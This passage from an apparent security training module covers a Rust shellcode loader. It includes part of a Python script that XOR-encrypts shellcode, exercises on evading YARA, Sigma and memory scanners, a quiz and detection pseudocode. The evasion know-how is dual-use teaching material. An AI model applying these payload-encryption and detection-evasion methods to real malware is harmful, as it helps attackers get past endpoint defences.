    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> <output.h>")
        sys.exit(1)

    shellcode = open(sys.argv[1], "rb").read()
    key = secrets.token_bytes(16)  # 16-byte random key

    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    print(f"[*] XOR key (hex):  {key.hex()}")

    encrypted = xor_encrypt(shellcode, key)

    # Verify roundtrip
    decrypted = xor_encrypt(encrypted, key)
    assert decrypted == shellcode, "Roundtrip failed!"
    print("[+] Encryption roundtrip verified")

    header = generate_c_header(encrypted, key)
    with open(sys.argv[2], "w") as f:
        f.write(header)
    print(f"[+] Written to {sys.argv[2]}")
```

### Reflection Questions

After building your encryptor, consider:

1. **Known-plaintext attack**: The Stage 01 shellcode starts with `E9` (jmp rel32). If an analyst knows the first decrypted byte is `E9`, they can XOR it with the first encrypted byte (`0xDE`) to recover the first key byte: `0xDE ^ 0xE9 = 0x37`. With enough known plaintext, the entire 16-byte key is recoverable. How would you defend against this? *(Answer: Use a different cipher mode where each byte depends on previous state — RC4, AES-CTR, or AES-GCM. XOR with a repeating key is vulnerable to known-plaintext by design.)*

2. **Entropy analysis**: What's the entropy of a XOR-encrypted blob with a 16-byte key? *(Answer: Near-maximum (~7.5-7.9 bits/byte) — XOR with a sufficiently long random key produces output that looks pseudorandom. The entropy alone doesn't distinguish XOR from AES or RC4.)*

3. **Detection resilience**: Does your YARA rule from Exercise 4.1 still detect a binary using a DIFFERENT XOR key? *(The `$xor_key_partial` pattern won't match. But `$hash_seed`, `$hash_mul`, `$mem_commit_reserve`, and `$page_rx` would still match if the loader uses the same API resolution and memory allocation patterns. This shows that **behavioral** indicators are more resilient than **key-specific** indicators.)*

4. **What changes in Stage 02**: Stage 02 uses the same XOR approach but with **in-place decryption** (decrypts directly in the VirtualAlloc'd buffer) and **post-execution memory zeroing**. How would zeroing the shellcode after execution affect memory forensics? *(The forensic window shrinks: you can only capture the plaintext between VirtualProtect(RX) and the zeroing loop. After zeroing, memory scanners find only zeros — the evidence is destroyed.)*

---

## Section 5B: Adversarial Thinking — Attack the Detection

**Time**: 20 minutes | **Type**: Design exercise

You've written YARA and Sigma rules to detect this loader. Now think like an attacker.

### Exercise: Break Your Own Detection

For each detection rule you wrote, design a modification that evades it while preserving functionality:

**Challenge 1: Break the YARA rule**

Your YARA rule targets `$hash_seed = { 4C 3D 2E 1F }`. How would you modify the binary to evade this without changing the hash algorithm's output?

<details>
<summary>Approaches</summary>

1. **Obfuscate the seed**: Store `0x1F2E3D4C` as `0x1F2E3D4B + 1` — compute it at runtime instead of embedding the constant. The YARA pattern won't match because the literal bytes `4C 3D 2E 1F` no longer appear in the binary
2. **Change the seed**: Use a completely different starting value. Pre-compute all hash values with the new seed. The YARA rule targeting `0x1F2E3D4C` is useless
3. **Use a different hash algorithm entirely**: CRC32, FNV-1a, murmur3, djb2. Each has different constants and patterns
4. **Compile-time computation**: Use Rust's `const fn` to compute hashes at compile time (this binary ALREADY does this). The seed appears in `const fn` evaluations that run in the compiler — the binary contains only the pre-computed hash values. However, the `resolve_api()` runtime function still contains the seed for matching against loaded DLLs

The deeper lesson: **hash algorithm choice is an arbitrary decision**. Detecting a specific seed catches exactly one variant. Detecting the PEB-walking pattern catches ALL variants regardless of hash algorithm.
</details>

**Challenge 2: Break the Sigma rule**

Your Sigma rule detects `VirtualProtect` changing protection from `0x04` to `0x20`. How would you avoid triggering this?

<details>
<summary>Approaches</summary>

1. **Allocate as RWX from the start**: Use `VirtualAlloc(RWX)` — no VirtualProtect call needed. But this triggers a DIFFERENT detection (RWX allocation)
2. **Use NtAllocateVirtualMemory directly**: Skip the kernel32 wrapper. The Sigma rule targeting NtProtectVirtualMemory by name won't fire if you use a different call path
3. **Use a different allocation method**: Map a section with `NtCreateSection` + `NtMapViewOfSection`. This can create executable memory without VirtualAlloc or VirtualProtect
4. **Module stomping** (Stage 12): Don't allocate new memory at all. Overwrite the .text section of an already-loaded DLL. The memory is already executable — no protection change needed

This shows why behavioral detection requires **multiple correlated signals**, not just one API call.
</details>

**Challenge 3: Make it invisible to pe-sieve**

pe-sieve flags `MEM_PRIVATE` executable regions. How do you get executable memory that pe-sieve considers legitimate?

<details>
<summary>Approaches</summary>

1. **Module stomping** (Stage 12): Write shellcode into a loaded DLL's .text section. pe-sieve sees `MEM_IMAGE` (legitimate), not `MEM_PRIVATE`
2. **RWX in an existing module**: Find a JIT region created by the CLR or V8 and overwrite it. pe-sieve whitelists these
3. **Phantom DLL loading**: Map a DLL from disk, modify it in memory, then execute. pe-sieve compares against the on-disk version and flags mismatches — but timing-based evasion (Stage 13) can make the comparison window extremely small

The progression: basic-loader uses `MEM_PRIVATE` → trivially detected by pe-sieve. Stage 12 uses `MEM_IMAGE` → much harder. Stage 13 adds temporal evasion → pe-sieve has a ~5% catch window.
</details>

### The Meta-Lesson

Every detection method has an evasion. Every evasion creates a new detection opportunity. This cycle never terminates. The goal isn't to "win" — it's to understand both sides deeply enough to make informed decisions about where to invest defensive (or offensive) resources.

The best defensive investment from this stage: **ETW-based detection of the RW→RX→Execute chain**. It catches this binary AND every variant, regardless of hash algorithm, XOR key, or benign code padding. The invariant is the memory protection transition — it cannot be avoided without fundamentally changing the execution model.

---

## Section 6: Knowledge Check

**Time**: 15 minutes | **Type**: Quiz (self-assessment)

Answer without looking back at the material. Check your answers after completing all questions.

---

**Q1**: What Windows structure does PEB-walking start from, and how is the PEB accessed on x86-64?

<details>
<summary>Answer</summary>

The Thread Environment Block (TEB) is accessed via the GS segment register. On x86-64: `mov rax, gs:[0x60]` reads the PEB pointer from TEB offset 0x60. The full chain is: `TEB (gs:[0x60]) → PEB → PEB_LDR_DATA → InLoadOrderModuleList` (doubly-linked list of loaded DLLs). Note: this binary walks **InLoadOrderModuleList** (where the executable itself appears first), NOT InMemoryOrderModuleList (where ntdll.dll appears first). Both are valid PEB-walking approaches — the difference is module enumeration order.

</details>

---

**Q2**: Why does the loader use `MEM_COMMIT|MEM_RESERVE` (0x3000) instead of just `MEM_COMMIT` (0x1000)?

<details>
<summary>Answer</summary>

`MEM_RESERVE` allocates a contiguous range of virtual address space without backing it with physical memory. `MEM_COMMIT` then backs that range with physical/page file memory. Using both together guarantees a contiguous block — critical because shellcode uses relative addressing (jumps, calls) that require contiguous memory. Using `MEM_COMMIT` alone might get non-contiguous pages if the address space is fragmented.

</details>

---

**Q3**: An analyst finds a PE with multiple DLL imports but 0 function imports from kernel32.dll related to memory allocation or threading. What technique does this indicate?

<details>
<summary>Answer</summary>

Dynamic API resolution (API hashing). The DLLs in the import table are **IAT padding** — benign imports added to make the binary's import profile resemble a normal GUI application. The actual offensive APIs (VirtualAlloc, VirtualProtect, CreateThread) are resolved at runtime by walking the PEB and matching function name hashes.

</details>

---

**Q4**: The loader uses multi-byte XOR to encrypt its payload. How would you identify XOR encryption during analysis without source code?

<details>
<summary>Answer</summary>

Look for the algorithmic structure:
- **XOR indicators**: A tight loop with a single `XOR` instruction per byte, a counter cycling via modulo (`AND reg, 0Fh` for 16-byte keys, or `DIV`/`IDIV` for other lengths), no state initialization, no block processing
- **Absence of complex crypto**: No 256-byte S-box init (rules out RC4), no 16-byte block processing with rounds (rules out AES), no key expansion/schedule
- **Symmetry**: The same function is used for both encryption and decryption — XOR is its own inverse. If the function is called once on the data and the result is usable, it's likely XOR

The key distinguishing feature is simplicity: XOR encryption compiles to ~3-5 instructions in the inner loop (load byte, XOR with key byte, store byte, increment counter, loop).

</details>

---

**Q5**: What is the difference between `PAGE_EXECUTE_READWRITE` (0x40) and the RW→RX two-step approach? Why does this matter for detection?

<details>
<summary>Answer</summary>

- `PAGE_EXECUTE_READWRITE` (0x40): Memory is simultaneously writable and executable. Almost no legitimate software does this — it's the #1 heuristic trigger for AV/EDR. Allocating RWX memory often causes immediate alerts.
- RW→RX two-step: First allocate as `PAGE_READWRITE` (0x04), write shellcode, then change to `PAGE_EXECUTE_READ` (0x20) via `VirtualProtect`. At no point does the page have both write and execute permissions simultaneously. This pattern is used by legitimate JIT compilers (.NET, V8, Java), making it harder to distinguish from normal behavior.

For detection: RWX allocations can be detected with a simple static check. The RW→RX pattern requires correlating two separate API calls (VirtualAlloc and VirtualProtect) with a time window, which is more complex and requires ETW/EDR telemetry.

</details>

---

**Q6**: You're writing a Sysmon-only detection rule. Can you detect this loader? What are your options and limitations?

<details>
<summary>Answer</summary>

**Limitations**: Sysmon cannot see VirtualAlloc, VirtualProtect, or same-process CreateThread calls. The core loader behavior is invisible.

**What you CAN detect**:
- **Event ID 1 (Process Creation)**: The binary starting. You can flag binaries from unusual paths, unsigned binaries, or binaries matching a YARA rule on disk
- **Event ID 7 (Image Load)**: DLLs being loaded. This binary's minimal IAT (no padding DLLs) means fewer unusual DLL loads, making this detection vector weaker than for padded binaries
- **Event ID 1 (child process)**: If the shellcode spawns a child process, you'll see it with basic-loader.exe as the parent. But the Stage 01 shellcode only shows a MessageBox — no child processes are created
- **Event ID 10 (Process Access)**: Won't fire for Stage 01 (same-process), but would fire in Stage 05 (cross-process injection)

**Bottom line**: Sysmon alone cannot reliably detect a same-process shellcode loader that doesn't spawn child processes. You need ETW-based telemetry (EDR) or periodic memory scanning (pe-sieve/Moneta) for comprehensive detection.

</details>

---

**Q7** (Bonus): Write pseudocode for a detection that correlates VirtualAlloc → VirtualProtect → CreateThread within the same process. What telemetry source provides this?

<details>
<summary>Answer</summary>

```
// Telemetry: Microsoft-Windows-Threat-Intelligence ETW provider
// Requires: PPL process (EDR kernel driver or Defender)

events = collect_from_etw("Microsoft-Windows-Threat-Intelligence")

for each process P:
    alloc_events = events.filter(
        type == "VirtualAlloc" AND
        process == P AND
        protect == PAGE_READWRITE AND
        type_flags == MEM_COMMIT|MEM_RESERVE
    )

    for each alloc in alloc_events:
        protect_events = events.filter(
            type == "VirtualProtect" AND
            process == P AND
            base_address == alloc.base_address AND
            new_protect == PAGE_EXECUTE_READ AND
            timestamp within 5 seconds of alloc.timestamp
        )

        for each protect in protect_events:
            thread_events = events.filter(
                type == "CreateThread" AND
                process == P AND
                start_address >= alloc.base_address AND
                start_address < alloc.base_address + alloc.size AND
                timestamp within 1 second of protect.timestamp
            )

            if thread_events.count > 0:
                ALERT("Shellcode staging detected",
                      process=P,
                      buffer=alloc.base_address,
                      size=alloc.size)
```

This requires the EtwTi provider, which is only accessible to Protected Process Light (PPL) services — typically EDR kernel drivers or Microsoft Defender for Endpoint.

</details>

---

## Module Summary

### What You've Learned

| Topic | Key Takeaway |
|-------|-------------|
| **Shellcode staging** | VirtualAlloc(RW) → Write → VirtualProtect(RX) → Execute is the universal pattern |
| **RW→RX vs RWX** | Two-step avoids the #1 heuristic trigger; mimics JIT compilers |
| **API hashing (loader)** | Additive hash (seed=0x1F2E3D4C, wrapping_mul 0x1003F, xor h>>11) eliminates string-based detection. Reversed via rainbow tables |
| **API hashing (shellcode)** | ROR13 (Metasploit block_api) — a second hashing layer inside the decrypted shellcode itself |
| **PEB-walking** | TEB[gs:0x60] → PEB → Ldr → InLoadOrderModuleList → PE export table. No imports needed |
| **XOR encryption** | Multi-byte XOR with a 16-byte repeating key. Trivially reversible but defeats signature matching |
| **Self-contained architecture** | No `common` library dependency — inline PEB walker, inline XOR, inline benign gates. Kills shared-code signatures (Agent.ION) |
| **Detection: YARA** | Combine multiple weak static signals (additive hash seed/multiplier, memory flags, entropy) |
| **Detection: Sigma/ETW** | RW→RX transition detection requires EtwTi — Sysmon is blind |
| **Detection gaps** | Same-process loaders are invisible to Sysmon Event ID 8; need ETW or memory scanning |

### Two-Level API Resolution

A unique aspect of this loader is its **dual hashing architecture**:

1. **Rust loader** (compile-time code): Uses an **additive hash** (seed `0x1F2E3D4C`, `wrapping_mul(0x1003F)`, `xor(h>>11)`) to resolve VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject, CloseHandle from kernel32.dll
2. **Shellcode** (embedded payload): Uses **ROR13** (rotate-right 13, Metasploit `block_api` style) to resolve LoadLibraryA, MessageBoxA, ExitThread at runtime

This means reverse engineering the binary requires understanding two different hashing algorithms. The additive hash values are pre-computed constants in `.rdata` (the Rust loader's approach). The ROR13 hashes are embedded as immediate values in the shellcode's x86-64 instructions (e.g., `mov r10d, 0x0726774C` for LoadLibraryA).

### What's Next

**Stage 02: XOR Loader** builds on this foundation by:
- Using the same XOR encryption but with **in-place decryption** (no intermediate heap buffer)
- Adding **post-execution memory zeroing** (anti-forensics: shellcode is scrubbed after execution)
- Achieving 0/76 VT detection

**Stage 03: AES Loader** introduces:
- A stream cipher deliberately mislabeled "AES" (actually RC4 with custom envelope — the mislabeling is the lesson)
- **Jigsaw fragmentation**: the encrypted payload is split into chunks and stored out-of-order, requiring a permutation map to reassemble before decryption

Each stage adds exactly ONE new technique, building a complete evasion stack by Stage 14.

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "XOR encryption is weak, so this loader is easy to detect" | XOR's job isn't to resist cryptanalysis — it's to prevent AV signature matching. And it works: 0/76 VT. The analyst who manually reverses the binary can break XOR in seconds, but AV automation cannot |
| "More evasion modules = better evasion" | Empirically false. Adding iat_pad+ballast to earlier versions of this binary INCREASED detections. The current version is self-contained with zero evasion modules — just inline code |
| "Direct syscalls are always better than API calls" | Not for this threat model. The binary calls kernel32 functions via PEB walking. Kernel32 calls look identical to legitimate code. Direct syscalls create a static `syscall` instruction signature that Huorong flags |
| "AV scans the binary and understands what it does" | AV runs statistical classifiers on PE features (entropy, imports, section names, byte distribution). It doesn't "understand" the code. Changing opt-level from "z" to 2 changed the classification without changing any functionality |
| "0/76 VT means the binary is safe" | 0/76 means zero static/heuristic/sandbox detections at scan time. An EDR with kernel callbacks, ETW monitoring, and memory scanning would likely catch the RW→RX→Execute chain at runtime. VT tests are necessary but not sufficient |

### What Breaks at Stage 02 — The Bridge

You've built detection rules for Stage 01. Here's what Stage 02 changes:

1. **Same XOR algorithm**, but the encrypted shellcode is decrypted **in-place** inside the VirtualAlloc'd buffer — no intermediate heap copy. Your debugger breakpoint strategy from Exercise 3.2 (catching the heap→page copy) won't work because there's no copy
2. **Post-execution zeroing**: After the shellcode finishes, the buffer is overwritten with zeros. Memory forensics must capture during execution, not after
3. **Different XOR key**: Your YARA rule's `$xor_key_partial` pattern breaks immediately

But your **Sigma rule** (RW→RX transition) still works — because the fundamental pipeline (allocate → protect → execute) hasn't changed. This is why behavioral detection outlives signature detection.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| Dynamic API Resolution | T1106 (Native API) | PEB walking + additive hash to resolve VirtualAlloc, VirtualProtect, CreateThread |
| Obfuscated Files or Information | T1027 | XOR-encrypted shellcode in .rdata |
| Reflective Code Loading | T1620 | VirtualAlloc + VirtualProtect + CreateThread to execute shellcode in own process (NOT cross-process injection — that begins at Stage 05) |
| Deobfuscate/Decode Files or Information | T1140 | Runtime XOR decryption before execution |
| Masquerading | T1036 | Hardware query APIs (GetSystemInfo, GlobalMemoryStatusEx) + CreateProcessW IAT anchor make binary look like a system utility |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 | Environment variable validation, KUSER_SHARED_DATA uptime check |

### Further Reading (2025-2026)

**Directly relevant to this stage:**
- [Hackmosphere: Bypassing Windows Defender in 2025 Part 1](https://www.hackmosphere.fr/en/bypassing-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-1/) — Same technique (XOR + loader), current Defender bypass results
- [Hackmosphere: Part 2](https://www.hackmosphere.fr/en/bypass-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-2/) — Practical implementation details
- [Microsoft: RIFT for Rust Malware Analysis](https://www.microsoft.com/en-us/security/blog/2025/06/27/unveiling-rift-enhancing-rust-malware-analysis-through-pattern-matching/) — How defenders analyze Rust binaries (know your adversary)
- [CrowdStrike: EMBER2024 Dataset](https://www.crowdstrike.com/en-us/blog/ember-2024-advancing-cybersecurity-ml-training-on-evasive-malware/) — The ML training dataset: 3.2M files including 6,315 adversarial samples

**Foundational resources:**
- cocomelonc: [Process Injection Series](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) — 21-part C implementation of injection techniques
- cocomelonc: [AV Evasion Series](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html) — 18-part evasion walkthrough
- [ired.team: Classic C Shellcode Launcher — 1 Byte Change](https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change) — Demonstrates signature fragility
- [RedOps.at: Direct Syscalls — High to Low](https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low) — Why Stage 07 exists (what comes after this)

**Rust-specific malware development:**
- [Whitecat18/Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development) — Comprehensive Rust maldev repo
- [Bishop Fox: Rust for Malware Development](https://bishopfox.com/blog/rust-for-malware-development) — Why Rust is the future of implant development
- [Teach2Breach/mal_ex](https://github.com/Teach2Breach/mal_ex) — Rust malware exercises

**C2 and operational context:**
- [WindShock: Endpoint Evasion Techniques 2020-2025](https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/) — The macro view of where this loader fits in the evolution
- [Alpha Hunt: Modular C2 Frameworks 2025-2026](https://blog.alphahunt.io/modular-c2-frameworks-quietly-redefine-threat-operations-for-2025-2026/) — Where Stage 15 is heading
